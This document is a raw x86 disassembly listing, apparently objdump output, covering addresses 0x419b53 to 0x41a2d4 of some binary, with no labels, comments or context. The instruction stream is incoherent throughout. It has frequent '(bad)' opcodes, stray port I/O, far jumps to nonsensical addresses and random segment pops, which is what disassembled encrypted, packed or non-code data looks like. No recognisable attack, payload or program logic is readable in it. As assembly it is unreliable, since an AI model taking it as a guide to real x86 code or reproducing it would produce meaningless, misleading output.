  419b53:	xor    dh,BYTE PTR [esi+0x1ef1aa38]
  419b59:	popf   
  419b5a:	bound  ebp,QWORD PTR [esi+edi*2-0x2]
  419b5e:	adc    al,0xcf
  419b60:	retf   
  419b61:	pop    es
  419b62:	mul    DWORD PTR [ebp+0x5db435ea]
  419b68:	mov    eax,ds:0x9b3575f7
  419b6d:	lea    ecx,[esp+ecx*1-0x65]
  419b71:	and    al,0x3c
  419b73:	ins    DWORD PTR es:[edi],dx
  419b74:	lock into 
  419b76:	xchg   esi,eax
  419b77:	retf   0x1773
  419b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b7c:	iret   
  419b7d:	dec    eax
  419b7e:	stc    
  419b7f:	fsub   DWORD PTR [edx+0x78]
  419b82:	add    edx,eax
  419b84:	pop    ebx
  419b85:	(bad)  
  419b87:	pop    ds
  419b88:	retf   0xae01
  419b8b:	inc    esi
  419b8c:	dec    edx
  419b8d:	cmp    BYTE PTR [ebp+eiz*4+0x7fdcf815],cl
  419b94:	mul    BYTE PTR [esp+ebx*2-0x53a8c3c]
  419b9b:	(bad)  
  419b9c:	(bad)  
  419b9d:	in     al,dx
  419b9e:	sbb    al,0xbe
  419ba0:	pop    ds
  419ba1:	xchg   DWORD PTR [edx],ebp
  419ba3:	std    
  419ba4:	add    ebp,ebx
  419ba6:	mov    ch,ah
  419ba8:	inc    ecx
  419ba9:	dec    edi
  419baa:	add    BYTE PTR [edi-0x51],al
  419bad:	int    0x3b
  419baf:	(bad)  
  419bb0:	and    eax,0xa7d10d49
  419bb5:	jae    0x419bc7
  419bb7:	mov    edx,eax
  419bb9:	sahf   
  419bba:	push   ebp
  419bbb:	xlat   BYTE PTR ds:[ebx]
  419bbc:	mov    edi,0xc2325fb8
  419bc1:	fisub  WORD PTR [edx+eax*2+0x16]
  419bc5:	fld    TBYTE PTR [esi+0x6ae90fc3]
  419bcb:	xchg   ebp,eax
  419bcc:	jmp    0x21f52094
  419bd1:	dec    esp
  419bd2:	pop    es
  419bd3:	adc    dh,BYTE PTR [edx+0x4]
  419bd6:	adc    BYTE PTR [eax],ah
  419bd8:	xor    dh,BYTE PTR [edx+0xd]
  419bdb:	(bad)  
  419bdc:	cwde   
  419bdd:	popf   
  419bde:	push   edi
  419bdf:	pop    esi
  419be0:	adc    DWORD PTR [eax-0x30f70d15],ebx
  419be6:	sahf   
  419be7:	rol    BYTE PTR [edx+0x3b],cl
  419bea:	adc    ch,BYTE PTR [edi+0x1952f1e9]
  419bf0:	(bad)  
  419bf1:	and    ch,dh
  419bf3:	inc    ebp
  419bf4:	sbb    eax,0x224717ba
  419bf9:	dec    esp
  419bfa:	inc    ebx
  419bfb:	xchg   esi,eax
  419bfc:	sbb    edx,DWORD PTR [edi+0x15b7105f]
  419c02:	(bad)  
  419c03:	test   BYTE PTR [edx-0xeef930e],0xe5
  419c0a:	data16 icebp 
  419c0c:	xor    ah,bl
  419c0e:	dec    eax
  419c0f:	adc    dh,bh
  419c11:	stos   BYTE PTR es:[edi],al
  419c12:	in     al,dx
  419c13:	(bad)  [esp+edi*4+0x5b]
  419c17:	call   0x5cd39d76
  419c1c:	cmp    bh,ch
  419c1e:	mov    ch,BYTE PTR [edx+0x544bf51c]
  419c24:	push   esi
  419c25:	add    al,BYTE PTR [edi+edi*8+0x29d5ebdd]
  419c2c:	adc    BYTE PTR [esi-0x51],al
  419c2f:	scas   al,BYTE PTR es:[edi]
  419c30:	ret    0x319c
  419c33:	or     cl,dh
  419c35:	cmp    eax,0x13e72c45
  419c3a:	push   ebx
  419c3b:	pop    ebp
  419c3c:	fimul  WORD PTR [edi-0x3dbb749c]
  419c42:	pop    ebx
  419c43:	test   BYTE PTR [ebx-0x2d],cl
  419c46:	jae    0x419c0d
  419c48:	push   ds
  419c49:	or     al,0xc2
  419c4b:	(bad)  
  419c4e:	lahf   
  419c4f:	push   0x22aeb6d4
  419c54:	mov    ecx,es
  419c56:	xchg   ebp,eax
  419c57:	cwde   
  419c58:	xlat   BYTE PTR ds:[ebx]
  419c59:	repnz scas al,BYTE PTR es:[edi]
  419c5b:	daa    
  419c5c:	push   edx
  419c5d:	out    dx,eax
  419c5e:	call   0x973a204a
  419c63:	xchg   edx,eax
  419c64:	repz xchg bh,bh
  419c67:	adc    eax,0x8be7e56
  419c6c:	sbb    esp,DWORD PTR [edi]
  419c6e:	or     eax,0xd04d714c
  419c73:	pusha  
  419c74:	xchg   edi,eax
  419c75:	retf   
  419c76:	loope  0x419c62
  419c78:	push   0x7b
  419c7a:	xchg   edi,eax
  419c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c7c:	cmc    
  419c7d:	loope  0x419cb1
  419c7f:	sbb    DWORD PTR [ecx+0x30],0xfffffff7
  419c83:	jmp    0x8f4:0xcefd36bc
  419c8a:	shl    edx,1
  419c8c:	shr    DWORD PTR [ebx-0x54],0xc7
  419c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c91:	push   0x49
  419c93:	lds    ecx,FWORD PTR [ebx]
  419c95:	test   BYTE PTR [ebx],cl
  419c97:	arpl   WORD PTR [ecx],sp
  419c99:	mov    esp,?
  419c9b:	and    al,0xa3
  419c9d:	out    dx,al
  419c9e:	jne    0x419c7a
  419ca0:	cmp    bh,BYTE PTR [ebp+0x45]
  419ca3:	cmp    ebp,DWORD PTR [ebx]
  419ca5:	pop    ecx
  419ca6:	and    BYTE PTR [ebx],0x63
  419ca9:	mov    ah,0x1c
  419cab:	pop    ds
  419cac:	not    dl
  419cae:	mov    ?,ebx
  419cb0:	(bad)  [ecx-0x32]
  419cb3:	(bad)  
  419cb4:	mov    ebx,0x61e8994e
  419cb9:	push   esp
  419cba:	fdivr  DWORD PTR [eax-0x508009cc]
  419cc0:	(bad)  
  419cc1:	mov    ds:0x589581c0,al
  419cc6:	add    al,0x84
  419cc8:	fld    DWORD PTR [edx+ebx*2]
  419ccb:	pop    esp
  419ccc:	cmp    BYTE PTR [ecx-0x40],0x3
  419cd0:	add    eax,DWORD PTR [ebx+edi*4+0x3b]
  419cd4:	aam    0x36
  419cd6:	mov    gs,WORD PTR [ecx+ecx*4]
  419cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cda:	ret    
  419cdb:	icebp  
  419cdc:	sti    
  419cdd:	lods   eax,DWORD PTR ds:[esi]
  419cde:	out    dx,eax
  419cdf:	push   ss
  419ce0:	dec    esp
  419ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ce2:	xlat   BYTE PTR ds:[ebx]
  419ce3:	inc    ebp
  419ce4:	ficomp WORD PTR [eax]
  419ce6:	jnp    0x419d62
  419ce8:	fisttp DWORD PTR [esi+0x61a16f38]
  419cee:	iret   
  419cef:	add    al,0x29
  419cf1:	out    dx,al
  419cf2:	(bad)  
  419cf3:	fsub   DWORD PTR [edx+0x23c9cd40]
  419cf9:	popf   
  419cfa:	das    
  419cfb:	add    al,0xdf
  419cfd:	mov    BYTE PTR [ebp-0x34ca5a5f],0x54
  419d04:	pop    ecx
  419d05:	push   ebx
  419d06:	sbb    eax,0xfbdbac33
  419d0b:	push   esi
  419d0c:	push   es
  419d0d:	xchg   esp,eax
  419d0e:	xchg   edi,eax
  419d0f:	out    dx,eax
  419d10:	fadd   QWORD PTR [edx+0x3e9ac227]
  419d16:	aad    0xec
  419d18:	fwait
  419d19:	mov    BYTE PTR [edx+esi*4-0x110503a3],ch
  419d20:	mov    ah,0xa0
  419d22:	adc    eax,ebp
  419d24:	test   DWORD PTR cs:[ecx-0x68df1cc3],0x1f9ae728
  419d2f:	stos   BYTE PTR es:[edi],al
  419d30:	call   0x4688:0x3c44a72b
  419d37:	sbb    BYTE PTR [ecx+ebp*4],cl
  419d3a:	shld   DWORD PTR [esi+ecx*8-0x4c],edi,cl
  419d3f:	xchg   eax,esi
  419d41:	arpl   WORD PTR [ecx],sp
  419d43:	inc    ecx
  419d44:	cmc    
  419d45:	sbb    dh,dl
  419d47:	out    0x56,al
  419d49:	arpl   WORD PTR [edx],bp
  419d4b:	jo     0x419cda
  419d4d:	sbb    dh,BYTE PTR [ebx+ebp*4]
  419d50:	mov    BYTE PTR [edx-0x198d0770],al
  419d56:	ror    DWORD PTR ds:0x545f09a3,1
  419d5c:	mov    dh,0x37
  419d5e:	dec    eax
  419d5f:	jg     0x419d79
  419d61:	leave  
  419d62:	faddp  st(2),st
  419d64:	push   esp
  419d65:	push   edx
  419d66:	pop    ecx
  419d67:	ds dec edx
  419d69:	cmp    al,0xcc
  419d6b:	fsub   DWORD PTR [edx]
  419d6d:	or     DWORD PTR [ecx+0x1692b9da],ecx
  419d73:	mov    esp,0xe693a392
  419d78:	adc    al,0xd
  419d7a:	clc    
  419d7b:	test   bl,dl
  419d7d:	imul   ebp,DWORD PTR [edi],0x72
  419d80:	retf   0xc952
  419d83:	repz iret 
  419d85:	in     al,dx
  419d86:	dec    edx
  419d87:	push   esp
  419d88:	cmp    bl,al
  419d8a:	mov    eax,0x78ba5608
  419d8f:	scas   eax,DWORD PTR es:[edi]
  419d90:	rcr    DWORD PTR [ebx-0x1deb9487],cl
  419d96:	adc    BYTE PTR [esi-0x39772b52],ch
  419d9c:	ins    DWORD PTR es:[edi],dx
  419d9d:	scas   al,BYTE PTR es:[edi]
  419d9e:	or     bl,cl
  419da0:	aad    0x8b
  419da2:	ins    DWORD PTR es:[edi],dx
  419da3:	xchg   edx,eax
  419da4:	push   ds
  419da5:	xchg   ebx,ebx
  419da7:	push   es
  419da8:	das    
  419da9:	sub    al,0xfb
  419dab:	iret   
  419dac:	std    
  419dad:	lds    edx,FWORD PTR [edx]
  419daf:	lea    ecx,[ecx+0x1a53f079]
  419db5:	fisub  DWORD PTR ss:[ebx]
  419db8:	add    ecx,DWORD PTR [edx]
  419dba:	mov    dl,0xb5
  419dbc:	jnp    0x419d90
  419dbe:	jb     0x419e38
  419dc0:	xchg   DWORD PTR [eax],edx
  419dc2:	mov    ds:0x7610ceb9,eax
  419dc7:	sub    ebp,edi
  419dc9:	xor    dl,bh
  419dcb:	faddp  st(3),st
  419dcd:	adc    BYTE PTR [ebp+0x69],dl
  419dd0:	mov    ah,0x9a
  419dd2:	outs   dx,BYTE PTR ds:[esi]
  419dd3:	in     eax,dx
  419dd4:	std    
  419dd5:	popf   
  419dd6:	jge    0x419dae
  419dd8:	xchg   edx,eax
  419dd9:	or     bl,BYTE PTR [ebp+0x436899db]
  419ddf:	push   es
  419de0:	fbstp  TBYTE PTR [ebx+edx*8+0x70bb1dc0]
  419de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419de8:	push   es
  419de9:	in     eax,dx
  419dea:	stc    
  419deb:	out    0x8a,eax
  419ded:	mov    cl,0xed
  419def:	mov    bl,0x6b
  419df1:	leave  
  419df2:	bound  ebp,QWORD PTR [eax+0x9]
  419df5:	inc    edx
  419df6:	pop    esp
  419df7:	cdq    
  419df8:	or     ch,ah
  419dfa:	pusha  
  419dfb:	in     al,dx
  419dfc:	pop    ebx
  419dfd:	js     0x419ddf
  419dff:	out    0xf5,al
  419e01:	jae    0x419da5
  419e03:	xchg   BYTE PTR [esi],cl
  419e05:	sbb    al,0xa9
  419e07:	or     DWORD PTR [esi-0x1ca189df],esp
  419e0d:	aam    0x84
  419e0f:	sub    dl,BYTE PTR [eax+0x36b3cb63]
  419e15:	mov    DWORD PTR [eax],ebp
  419e17:	xchg   esi,eax
  419e18:	iret   
  419e19:	jge    0x419de2
  419e1b:	push   edx
  419e1c:	aaa    
  419e1d:	add    DWORD PTR [ebx+0x3fd830e8],esi
  419e23:	sub    eax,0x51d12b0d
  419e28:	sbb    BYTE PTR [edx],bl
  419e2a:	shl    DWORD PTR [eax],1
  419e2c:	ret    
  419e2d:	xchg   DWORD PTR [edi],ebx
  419e2f:	jecxz  0x419eaa
  419e31:	inc    eax
  419e32:	jo     0x419e04
  419e34:	adc    BYTE PTR [edx-0x1b],bl
  419e37:	call   0x8c03ef22
  419e3c:	fnstsw WORD PTR [ebp-0x184565aa]
  419e42:	sbb    eax,0x4d0c2564
  419e47:	jns    0x419e7b
  419e49:	xchg   DWORD PTR [edi+edi*4+0x36012ab3],esi
  419e50:	(bad)  
  419e51:	sub    eax,0x418da7d4
  419e56:	js     0x419e50
  419e58:	pop    esp
  419e59:	and    eax,0x47c8ffc3
  419e5e:	mov    bl,0x8f
  419e60:	push   ss
  419e61:	icebp  
  419e62:	inc    edx
  419e63:	sub    DWORD PTR [ecx+edx*4-0x31],0xffffffc0
  419e68:	sub    BYTE PTR [edx],0x5d
  419e6b:	and    BYTE PTR [ebx+0x20],cl
  419e6e:	dec    ecx
  419e6f:	cmp    al,0xa3
  419e71:	leave  
  419e72:	mov    cl,0x96
  419e74:	mov    bh,0x89
  419e76:	xchg   edx,eax
  419e77:	mov    edi,0xcb403db8
  419e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e7d:	jns    0x419e18
  419e7f:	xor    BYTE PTR [edi+0x2],bh
  419e82:	aam    0x79
  419e84:	adc    al,BYTE PTR [edi]
  419e86:	mov    ebx,0x26c85f47
  419e8b:	out    0x99,eax
  419e8d:	pop    edi
  419e8e:	cmp    ebx,ebx
  419e90:	or     BYTE PTR [ecx],ch
  419e92:	(bad)  
  419e93:	int3   
  419e94:	adc    eax,0x91920abc
  419e99:	int3   
  419e9a:	test   BYTE PTR [esi],dh
  419e9c:	pop    es
  419e9d:	xor    DWORD PTR [ecx],eax
  419e9f:	loopne 0x419eff
  419ea1:	iret   
  419ea2:	and    bl,dl
  419ea4:	js     0x419ef9
  419ea6:	data16 lock cmp BYTE PTR [esi-0x1a],al
  419eab:	pop    ebp
  419eac:	or     eax,0xd7d63d45
  419eb1:	sub    esi,esi
  419eb3:	sub    BYTE PTR [esi],bh
  419eb5:	call   0xa7f7:0x1c171fea
  419ebc:	or     esp,DWORD PTR [edi-0x73adc483]
  419ec2:	mov    cl,bl
  419ec4:	mov    ds:0x2a0114f8,eax
  419ec9:	mov    ch,0x8b
  419ecb:	das    
  419ecc:	test   BYTE PTR [ecx],ch
  419ece:	out    dx,al
  419ecf:	xor    al,0x3a
  419ed1:	add    al,0x5f
  419ed3:	and    DWORD PTR [edx+0x1],eax
  419ed6:	xchg   edx,eax
  419ed7:	jmp    0xb3ea0213
  419edc:	add    eax,0xb98e07b0
  419ee1:	inc    ebp
  419ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ee3:	push   eax
  419ee4:	or     ah,al
  419ee6:	rcl    DWORD PTR [eax-0x71cbb043],0x38
  419eed:	mov    al,ds:0x99e8539
  419ef2:	fild   QWORD PTR [esi]
  419ef4:	xchg   BYTE PTR [edi-0x56],bh
  419ef7:	or     ecx,ecx
  419ef9:	push   edx
  419efa:	mov    es:0x2c96af87,al
  419f00:	or     al,0x31
  419f02:	xchg   ecx,eax
  419f03:	mov    esi,0x18d20c9b
  419f08:	outs   dx,DWORD PTR ds:[esi]
  419f09:	sub    esi,DWORD PTR [edx+0x4f25c4e8]
  419f0f:	sar    eax,0x31
  419f12:	dec    esi
  419f13:	sbb    DWORD PTR [ebp-0x25],edi
  419f16:	scas   eax,DWORD PTR es:[edi]
  419f17:	fcmovb st,st(2)
  419f19:	popa   
  419f1a:	mov    esi,0x83f1d16e
  419f1f:	inc    edi
  419f20:	sub    eax,0x64e94c90
  419f25:	cmc    
  419f26:	dec    edx
  419f27:	(bad)  
  419f29:	retf   0x1753
  419f2c:	pop    ebx
  419f2d:	adc    dh,dl
  419f2f:	ret    0xaf32
  419f32:	or     esi,0x3f
  419f35:	or     BYTE PTR [esi+0x5],ch
  419f38:	or     esi,DWORD PTR [ebp-0xd]
  419f3b:	jo     0x419f78
  419f3d:	aam    0x33
  419f3f:	mov    ds:0x29904247,eax
  419f44:	loopne 0x419ef6
  419f46:	mov    al,ds:0xe2e93af4
  419f4b:	jns    0x419f1f
  419f4d:	xor    dh,BYTE PTR [ebx-0x78]
  419f50:	push   ds
  419f51:	mov    ?,WORD PTR [eax*8+0x77697f54]
  419f58:	mov    esp,0x855f6702
  419f5d:	loope  0x419f9f
  419f5f:	in     eax,0x26
  419f61:	pop    esp
  419f62:	mov    ebp,0x78ce3e35
  419f67:	jp     0x419fdb
  419f69:	pop    ebp
  419f6a:	lea    ebx,[ebp-0x58]
  419f6d:	add    edx,0x2e5a09b2
  419f73:	fbstp  TBYTE PTR [edi]
  419f75:	in     al,dx
  419f76:	pop    ebx
  419f77:	pop    ebx
  419f78:	loop   0x419f06
  419f7a:	push   edx
  419f7b:	mov    ds:0x56115a63,al
  419f80:	dec    esi
  419f81:	add    al,0xbc
  419f83:	dec    ecx
  419f84:	fcom   QWORD PTR [eax]
  419f86:	sub    eax,0x81c9c673
  419f8b:	pushf  
  419f8c:	cwde   
  419f8d:	lods   al,BYTE PTR ds:[esi]
  419f8e:	and    bh,BYTE PTR [edi+0x49196011]
  419f94:	ret    
  419f95:	cmp    DWORD PTR [bx+di-0x29],0xce03f1c4
  419f9d:	aad    0x80
  419f9f:	pop    esi
  419fa0:	or     DWORD PTR [esi+0x1c3fe429],edx
  419fa6:	cmp    DWORD PTR [ecx],ecx
  419fa8:	inc    edi
  419fa9:	jb     0x41a014
  419fab:	inc    esi
  419fac:	mov    bh,0x60
  419fae:	and    ch,bl
  419fb0:	leave  
  419fb1:	scas   al,BYTE PTR es:[edi]
  419fb2:	call   0x83d9:0x2f945b3b
  419fb9:	sbb    esp,eax
  419fbb:	cmp    al,0x78
  419fbd:	loopne 0x419f45
  419fbf:	imul   ecx,DWORD PTR [ebx+eax*2-0x72],0x18
  419fc4:	adc    esp,DWORD PTR [esi+0x75a7b95f]
  419fca:	cdq    
  419fcb:	retf   
  419fcc:	daa    
  419fcd:	adc    edi,ebx
  419fcf:	repnz adc BYTE PTR fs:0x4b43827d,ah
  419fd7:	rcl    edx,0x1b
  419fda:	pop    esi
  419fdb:	gs test al,0x9f
  419fde:	clc    
  419fdf:	loop   0x41a027
  419fe1:	mov    ebp,0xf22639c6
  419fe6:	lds    edx,FWORD PTR [ebp-0x3f0cf4fd]
  419fec:	retf   
  419fed:	jo     0x419fbd
  419fef:	ds mov dh,0xe6
  419ff2:	out    0x8c,eax
  419ff4:	push   0xd21f322b
  419ff9:	fs mov ecx,0xaf4ec657
  419fff:	inc    esp
  41a000:	push   ss
  41a001:	adc    ebx,edx
  41a003:	xchg   ecx,eax
  41a004:	sbb    esp,esi
  41a006:	daa    
  41a007:	adc    eax,0xfced9f97
  41a00c:	adc    al,0xb9
  41a00e:	jmp    0x41a081
  41a010:	outs   dx,BYTE PTR ds:[esi]
  41a011:	xor    BYTE PTR [ecx],dh
  41a013:	leave  
  41a014:	push   ss
  41a015:	outs   dx,DWORD PTR ds:[esi]
  41a016:	cmp    BYTE PTR [ebx],dh
  41a018:	jmp    0x23691163
  41a01d:	cs xor al,0x58
  41a020:	js     0x41a01f
  41a022:	arpl   WORD PTR [eax-0x28],bx
  41a025:	add    BYTE PTR [ecx-0x7b],cl
  41a028:	dec    eax
  41a029:	popf   
  41a02a:	jmp    0x8bec:0x6ab8dbd9
  41a031:	outs   dx,DWORD PTR ds:[esi]
  41a032:	addr16 test eax,0x494b902e
  41a038:	retf   
  41a039:	xchg   ebx,eax
  41a03a:	(bad)  
  41a03b:	loop   0x41a006
  41a03d:	dec    di
  41a03f:	pop    ebx
  41a040:	je     0x419fcb
  41a042:	add    esi,DWORD PTR [esi-0x68035a08]
  41a048:	jno    0x419fe1
  41a04a:	outs   dx,BYTE PTR ds:[esi]
  41a04b:	shr    edi,cl
  41a04d:	jmp    0x419fd0
  41a04f:	add    al,0x73
  41a051:	aas    
  41a052:	lods   eax,DWORD PTR ds:[esi]
  41a053:	test   BYTE PTR [edi-0x7e],cl
  41a056:	adc    eax,0x2c02aecf
  41a05b:	push   ebp
  41a05c:	jl     0x41a08f
  41a05e:	mov    dh,0x8b
  41a060:	sbb    DWORD PTR [ecx+0x3f856814],0x3e
  41a067:	mov    ds,WORD PTR [edx+0x2e]
  41a06a:	push   ds
  41a06b:	cli    
  41a06c:	push   ss
  41a06d:	sub    DWORD PTR [ebp+0xf29e1f],ebp
  41a073:	fld    DWORD PTR [ecx]
  41a075:	popf   
  41a076:	test   eax,0x8b1e7f23
  41a07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a07c:	jbe    0x41a076
  41a07e:	hlt    
  41a07f:	clc    
  41a080:	repnz push esi
  41a082:	mov    eax,0xae9d346
  41a087:	inc    DWORD PTR fs:[edi+0x57]
  41a08b:	outs   dx,BYTE PTR gs:[esi]
  41a08d:	test   esi,ebx
  41a08f:	fdivr  QWORD PTR [edx]
  41a091:	(bad)  [ebp+esi*8-0xf5413ec]
  41a098:	std    
  41a099:	xchg   ebp,eax
  41a09a:	ja     0x41a0b8
  41a09c:	xchg   ebp,eax
  41a09d:	div    DWORD PTR [ebp+0x40827215]
  41a0a3:	or     ah,ch
  41a0a5:	push   ebp
  41a0a6:	sbb    DWORD PTR [ebx+edi*8],0x14
  41a0aa:	xor    DWORD PTR [eax+ebx*8],edi
  41a0ad:	sub    BYTE PTR [ebx],0x67
  41a0b0:	stos   DWORD PTR es:[edi],eax
  41a0b1:	xchg   ecx,eax
  41a0b2:	(bad)  [edi]
  41a0b4:	imul   esi,edi,0xb6b1560f
  41a0ba:	xchg   DWORD PTR [edx-0x28],esi
  41a0bd:	xor    ecx,DWORD PTR [edx-0x54]
  41a0c0:	imul   edi,DWORD PTR [esp+ebp*4],0xdffbfec7
  41a0c7:	jmp    0x41a09d
  41a0c9:	shr    DWORD PTR [ebp+0x346b544d],1
  41a0cf:	clc    
  41a0d0:	add    al,0xa
  41a0d2:	jno    0x41a0c2
  41a0d4:	inc    ebx
  41a0d5:	mov    cl,0xad
  41a0d7:	inc    esi
  41a0d8:	mov    bh,0x4f
  41a0da:	xchg   edx,eax
  41a0db:	jo     0x41a0fc
  41a0dd:	popa   
  41a0de:	clc    
  41a0df:	into   
  41a0e0:	jb     0x41a14d
  41a0e2:	inc    esp
  41a0e3:	mov    edx,0xb7036923
  41a0e8:	fs test ebp,esp
  41a0eb:	push   ecx
  41a0ec:	jb     0x41a123
  41a0ee:	rcr    BYTE PTR [ebp+0x1c424b30],0x7e
  41a0f5:	add    BYTE PTR [eax+0x33],al
  41a0f8:	test   eax,0x89d36b71
  41a0fd:	push   edx
  41a0fe:	fidiv  DWORD PTR ds:0x738f2bf2
  41a104:	mov    ecx,0x6f7833d1
  41a109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a10a:	lea    eax,[ecx-0x764c2318]
  41a110:	mov    ds:0xadc11c3e,eax
  41a115:	jnp    0x41a0a8
  41a117:	mov    cl,0xc0
  41a119:	das    
  41a11a:	shl    BYTE PTR [edi+0x46],cl
  41a11d:	pop    ecx
  41a11e:	idiv   BYTE PTR [esi]
  41a120:	jns    0x41a0ee
  41a122:	int3   
  41a123:	pop    ecx
  41a124:	ss jb  0x41a0d1
  41a127:	stc    
  41a128:	out    dx,al
  41a129:	leave  
  41a12a:	pop    ebp
  41a12b:	adc    DWORD PTR [edx],eax
  41a12d:	mov    ebx,0xb8f9884f
  41a132:	jae    0x41a19e
  41a134:	das    
  41a135:	mov    BYTE PTR [ebx-0x22798c36],dh
  41a13b:	jb     0x41a0ce
  41a13d:	aad    0xe4
  41a13f:	jecxz  0x41a169
  41a141:	lds    edx,FWORD PTR [esi+eax*4]
  41a144:	sub    cl,BYTE PTR [edx-0x68c31acf]
  41a14a:	jbe    0x41a1a5
  41a14c:	idiv   BYTE PTR [eax+0x22]
  41a14f:	mov    al,0x74
  41a151:	daa    
  41a152:	(bad)  
  41a153:	fsub   QWORD PTR [esi-0x7ef76d90]
  41a159:	cmp    bh,BYTE PTR [esi-0x3f]
  41a15c:	sbb    DWORD PTR [eax+0x31],0xbebbf764
  41a163:	add    eax,0x50c541f6
  41a168:	dec    edx
  41a169:	push   edx
  41a16a:	dec    esi
  41a16b:	or     eax,0x9f4dcaaa
  41a170:	ss and BYTE PTR es:[ebp-0x5e],dl
  41a175:	pusha  
  41a176:	clc    
  41a177:	ror    DWORD PTR [eax],1
  41a179:	add    esp,DWORD PTR [esi-0x5d9452ef]
  41a17f:	push   eax
  41a180:	push   eax
  41a181:	pop    ebp
  41a182:	div    DWORD PTR [edx]
  41a184:	cs cdq 
  41a186:	xchg   edi,edi
  41a188:	cmp    bh,dh
  41a18a:	sbb    ch,ch
  41a18c:	(bad)  
  41a18d:	repz xchg edx,eax
  41a18f:	daa    
  41a190:	ja     0x41a1d3
  41a192:	inc    edx
  41a193:	xchg   ecx,eax
  41a194:	scas   eax,DWORD PTR es:[edi]
  41a195:	neg    DWORD PTR [ebp-0xa]
  41a198:	pop    edi
  41a199:	mov    bh,0x67
  41a19b:	ror    DWORD PTR [eax],0x14
  41a19e:	adc    DWORD PTR [eax+0x34],0x5d60df5a
  41a1a5:	in     al,0xac
  41a1a7:	mov    ch,0xa2
  41a1a9:	mov    eax,ecx
  41a1ab:	and    edi,ebp
  41a1ad:	aam    0x32
  41a1af:	ficomp WORD PTR ds:0x9bda1e78
  41a1b5:	idiv   DWORD PTR [esi-0x26]
  41a1b8:	jns    0x41a210
  41a1ba:	in     eax,0xf7
  41a1bc:	mov    WORD PTR [esi-0x22742407],ds
  41a1c2:	jp     0x41a1d5
  41a1c4:	lea    edx,[ebx]
  41a1c6:	mov    dl,0x93
  41a1c8:	mov    bl,0xe9
  41a1ca:	in     eax,dx
  41a1cb:	ja     0x41a220
  41a1cd:	pop    ebx
  41a1ce:	sbb    eax,0x38ed12a9
  41a1d3:	jno    0x41a213
  41a1d5:	aas    
  41a1d6:	loope  0x41a1f3
  41a1d8:	sbb    eax,0xf1f0c698
  41a1dd:	pop    ecx
  41a1de:	xchg   ebp,eax
  41a1df:	jae    0x41a1c8
  41a1e1:	mov    bh,0x8a
  41a1e3:	test   al,0xfa
  41a1e5:	inc    edi
  41a1e6:	loop   0x41a1fa
  41a1e8:	xor    eax,0xc4a1138a
  41a1ed:	enter  0xb2a7,0xb9
  41a1f1:	add    BYTE PTR [ecx+0x2e],bh
  41a1f4:	out    dx,al
  41a1f5:	xchg   esi,eax
  41a1f6:	push   ebp
  41a1f7:	sahf   
  41a1f8:	mov    dl,0x6a
  41a1fa:	adc    BYTE PTR [ebp-0x5cdf21f0],dl
  41a200:	push   0xa2a913f8
  41a205:	sub    eax,DWORD PTR ds:0x95c79510
  41a20b:	jne    0x41a197
  41a20d:	lods   eax,DWORD PTR ds:[esi]
  41a20e:	xchg   esp,eax
  41a20f:	(bad)  
  41a210:	test   DWORD PTR [ecx+0x420b7341],0x908e85d8
  41a21a:	or     DWORD PTR [eax-0x1a],esi
  41a21d:	pusha  
  41a21e:	push   cs
  41a21f:	mov    cl,0xc4
  41a221:	fwait
  41a222:	in     al,0x8c
  41a224:	mov    al,ds:0x380b181
  41a229:	mul    BYTE PTR [ecx+0x1e248b70]
  41a22f:	fcomp  DWORD PTR [ebx+ebp*1]
  41a232:	ret    0xc5a0
  41a235:	mov    edx,0x7cfb676f
  41a23a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a23b:	jns    0x41a246
  41a23d:	loop   0x41a1c7
  41a23f:	push   es
  41a240:	sti    
  41a241:	test   DWORD PTR [edx-0x35be87bd],0x73164a88
  41a24b:	pop    ds
  41a24c:	call   0x63a1010c
  41a251:	and    eax,0xe0dc7ecd
  41a256:	add    dl,BYTE PTR [edi+edi*2-0x21]
  41a25a:	push   eax
  41a25b:	jmp    0x41a26b
  41a25d:	mov    esp,0x97374502
  41a262:	call   0x2fcd:0xf9a408be
  41a269:	xchg   esp,eax
  41a26a:	cmc    
  41a26b:	pop    ebx
  41a26c:	jo     0xde8b273a
  41a272:	in     al,dx
  41a273:	sbb    BYTE PTR [ecx+edi*2],bh
  41a276:	pop    ebp
  41a277:	sar    BYTE PTR [edi],1
  41a279:	push   esp
  41a27a:	leave  
  41a27b:	call   0x775a99c8
  41a280:	mov    al,BYTE PTR [ebp+0x58]
  41a283:	sub    esp,esi
  41a285:	pop    eax
  41a286:	ins    DWORD PTR es:[edi],dx
  41a287:	dec    esp
  41a288:	dec    esi
  41a289:	js     0x41a21c
  41a28b:	fistp  WORD PTR [ebx+0x7db7e158]
  41a291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a292:	inc    ebx
  41a293:	test   DWORD PTR [ebx+0xc],ecx
  41a296:	lea    edx,[ecx]
  41a298:	shl    DWORD PTR [ebx],cl
  41a29a:	jae    0x41a26c
  41a29c:	jp     0x41a2f3
  41a29e:	(bad)
  41a2a1:	push   0xffffffc5
  41a2a3:	aam    0x8c
  41a2a5:	cmp    bl,BYTE PTR [ebx-0x69db7a0e]
  41a2ab:	mov    bl,al
  41a2ad:	fdivr  DWORD PTR [edx]
  41a2af:	jl     0x41a236
  41a2b1:	dec    ecx
  41a2b2:	scas   al,BYTE PTR es:[edi]
  41a2b3:	sub    ebx,DWORD PTR [ebp+eiz*4-0x14]
  41a2b7:	cmp    BYTE PTR [ebp-0x2c],ch
  41a2ba:	out    0x70,al
  41a2bc:	xchg   edi,eax
  41a2bd:	jge    0x41a2b7
  41a2bf:	sub    al,0x6a
  41a2c1:	(bad)  [ebx-0x5dec5440]
  41a2c7:	test   edi,esp
  41a2c9:	mov    fs,WORD PTR [eax]
  41a2cb:	cld    
  41a2cc:	sub    cl,BYTE PTR [edx-0x5f2af473]
  41a2d2:	sub    bh,ch
  41a2d4:	pop    ds
